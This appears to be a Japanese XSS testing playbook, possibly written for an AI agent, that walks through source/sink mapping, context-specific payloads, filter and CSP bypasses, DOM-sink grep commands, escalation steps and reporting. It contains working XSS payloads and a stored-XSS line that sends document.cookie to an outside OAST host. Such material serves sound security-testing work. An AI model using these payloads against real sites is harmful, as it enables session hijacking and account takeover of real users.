# XSS — Manual / 汎用ツール

`client-side` の Phase 2 / Phase 5 から呼ばれる、reflected / stored / DOM-based XSS の context 別深掘り。

## いつ切替えるか

- 入力点が応答 HTML / JS / URL / fragment / postMessage 等に流れ、ユーザコントロールの string が DOM に入る
- 生 HTML を返す page、user-generated content (comment / profile / message)
- SPA (React / Vue / Angular / Svelte) の client-side render
- WAF / CSP / sanitizer がある対象で bypass を試す

## Phase 1 — source / sink の map

source:

```
- query / fragment / hash
- form fields / textarea / file upload metadata
- cookie 値
- localStorage / sessionStorage
- postMessage event.data
- WebSocket onmessage
- 3rd party script via JSONP
```

sink:

```
HTML insertion: innerHTML / outerHTML / insertAdjacentHTML / document.write
URL: location / href / src
JS execution: eval / Function / setTimeout(string)
React: dangerouslySetInnerHTML
Vue: v-html
Angular: bypassSecurityTrust*
template literal: ${} 展開
```

source → sink の chain を ≧1 本ずつ identify。

## Phase 2 — context 別 payload

| context | payload 例 |
|---|---|
| HTML body | `<script>alert(1)</script>` `<img src=x onerror=alert(1)>` `<svg/onload=alert(1)>` |
| HTML attr (引用符内) | `" autofocus onfocus=alert(1) x="` |
| HTML attr (引用符無) | `x onmouseover=alert(1)` |
| JS string (二重) | `";alert(1);"` |
| JS string (一重) | `';alert(1);'` |
| JS template literal | `${alert(1)}` |
| URL (href / src) | `javascript:alert(1)` |
| URL (img src) | `x" onerror=alert(1) "` |
| CSS | `expression(alert(1))` (旧 IE) |
| HTML comment | `--><script>alert(1)</script>` |

## Phase 3 — sanitizer / WAF bypass

```
- 大文字混在: <ScRiPt>alert(1)</ScRiPt>
- 改行: <img src=x on error=alert(1)>
- backslash: <a hreF=jAvAsCrIpT:alert(1)>
- unicode entity: &#x6a;avascript:alert(1)
- HTML entity: &lt; vs <
- nested filter: <<script>alert(1)//
- mutation XSS (mXSS): innerHTML 経由で再 parse される
- DOMPurify bypass (古い版): mathml / svg / mglyph
- Trusted Types: policy 名衝突狙い
```

## Phase 4 — CSP bypass

CSP が存在する場合の攻略:

```
- script-src の許可元に CDN (cdnjs / unpkg / google) があれば JSONP / lib gadget
- 'unsafe-inline' があれば direct payload
- 'unsafe-eval' があれば eval ベース gadget
- nonce が予測可能 / 全リクエスト固定 → reuse
- strict-dynamic + script tag injection → 子 script 許可
- base-uri 不在 → <base> 注入で相対 src を hijack
```

## Phase 5 — DOM-based 特定

`document.URL` / `location.search` / `location.hash` / `referrer` / `cookie` / `name` / `localStorage` を読み、上記 sink に入れる JS を grep:

```
grep -rn 'innerHTML\|outerHTML\|document.write\|eval(' .
grep -rn 'location.hash\|location.search' .
```

そのチェーンに対して `https://target/page#<payload>` を試す。

## Phase 6 — stored XSS

profile / comment / file metadata に payload 保存 → 別 page で発火するか確認。発火タイミングが non-deterministic (admin が見たとき) の場合は OAST callback で確認:

```
"><script>fetch('https://my.oast.fun/?c='+document.cookie)</script>
```

## Phase 7 — 影響実証

```
1. 表示 XSS (alert(1))                          # PoC 最低限
2. cookie 取得 (test account のみ)
3. CSRF token / form action hijack
4. session 乗取りによる admin 操作 (test account 同士)
5. clickjack 風 overlay と組合せた phishing UI
```

## Phase 8 — レポート

```
- 注入点 / context / payload
- bypass した防御 (sanitizer / WAF / CSP)
- 発火条件 (どの user role / どの URL)
- 影響 (cookie 取得 / CSRF token 漏洩 / アカウント乗取)
- 修正 (output encoding / sanitizer 上書き禁止 / CSP nonce / Trusted Types)
```

## Tools

```
xsstrike / xsser
burp + DOM Invader / Reflector
xsshunter / canarytokens (stored XSS callback)
dalfox
WebFetch
Bash (sandbox)
```
